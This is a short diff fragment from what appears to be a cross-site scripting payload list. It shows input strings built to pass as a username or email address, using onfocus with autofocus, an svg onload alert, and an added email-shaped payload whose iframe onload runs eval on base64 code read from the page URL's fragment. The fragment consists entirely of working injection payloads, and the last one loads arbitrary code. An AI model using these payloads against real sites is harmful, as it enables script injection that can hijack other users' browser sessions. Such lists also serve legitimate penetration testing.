@@ -17,3 +17,4 @@ DrakenKun"onfocus="prompt(1)"autofocus="
 
 //Email
 test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
+"<iframe/onload=eval(atob(location.hash.substring(1)))>"@gmail.com
